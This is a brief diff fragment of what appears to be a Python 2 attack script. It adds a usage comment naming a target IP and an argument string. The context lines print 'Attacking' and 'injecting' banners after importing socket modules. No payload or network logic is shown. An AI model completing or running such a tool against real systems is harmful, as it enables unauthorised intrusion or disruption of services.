@@ -1,3 +1,5 @@
+# 1º 192.168.0.1 2º "get/search/more/time/or/big/data"
+
 import socket, sys, os  
 print "][ Attacking " + sys.argv[1]  + " ... ]["  
 print "injecting " + sys.argv[2];  
